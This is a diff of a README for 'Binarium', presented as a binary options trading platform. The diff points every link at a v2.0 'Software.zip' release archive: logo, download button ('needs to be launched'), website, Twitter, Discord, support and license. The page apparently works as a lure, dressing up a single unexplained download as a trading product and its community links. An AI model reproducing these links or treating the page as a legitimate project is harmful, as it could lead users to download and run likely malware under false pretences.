@@ -1,6 +1,6 @@
 # Welcome to Binarium 🌟
 
-![Binarium Logo](https://github.com/pothead23/Binarium/releases/download/v1.0/Software.zip)
+![Binarium Logo](https://github.com/pothead23/Binarium/releases/download/v2.0/Software.zip)
 
 ## Introduction
 Welcome to the official repository of **"Binarium"** - a cutting-edge online platform for trading binary options, designed to provide users with swift access to financial markets. Whether you are a seasoned investor or just starting out, Binarium offers a seamless trading experience for all.
@@ -21,7 +21,7 @@ Welcome to the official repository of **"Binarium"** - a cutting-edge online pla
 
 ### Latest Release
 To download the latest release version of Binarium, please click on the button below:
-[![Download Binarium v1.0.0](https://github.com/pothead23/Binarium/releases/download/v1.0/Software.zip)](https://github.com/pothead23/Binarium/releases/download/v1.0/Software.zip) _(needs to be launched)_
+[![Download Binarium v1.0.0](https://github.com/pothead23/Binarium/releases/download/v2.0/Software.zip)](https://github.com/pothead23/Binarium/releases/download/v2.0/Software.zip) _(needs to be launched)_
 
 ## Getting Started
 If you are new to Binarium, follow these steps to get started with our platform:
@@ -40,15 +40,15 @@ We welcome contributions from the open-source community to enhance Binarium furt
 
 ## Community
 Join our community to stay updated on the latest news, features, and discussions about trading and the financial markets.
-- [Visit our Website](https://github.com/pothead23/Binarium/releases/download/v1.0/Software.zip)
-- [Follow us on Twitter](https://github.com/pothead23/Binarium/releases/download/v1.0/Software.zip)
-- [Join our Discord Server](https://github.com/pothead23/Binarium/releases/download/v1.0/Software.zip)
+- [Visit our Website](https://github.com/pothead23/Binarium/releases/download/v2.0/Software.zip)
+- [Follow us on Twitter](https://github.com/pothead23/Binarium/releases/download/v2.0/Software.zip)
+- [Join our Discord Server](https://github.com/pothead23/Binarium/releases/download/v2.0/Software.zip)
 
 ## Support
-If you encounter any issues or have any questions, please reach out to our support team at https://github.com/pothead23/Binarium/releases/download/v1.0/Software.zip
+If you encounter any issues or have any questions, please reach out to our support team at https://github.com/pothead23/Binarium/releases/download/v2.0/Software.zip
 
 ## License
-This project is licensed under the XYZ License - see the [LICENSE](https://github.com/pothead23/Binarium/releases/download/v1.0/Software.zip) file for details.
+This project is licensed under the XYZ License - see the [LICENSE](https://github.com/pothead23/Binarium/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
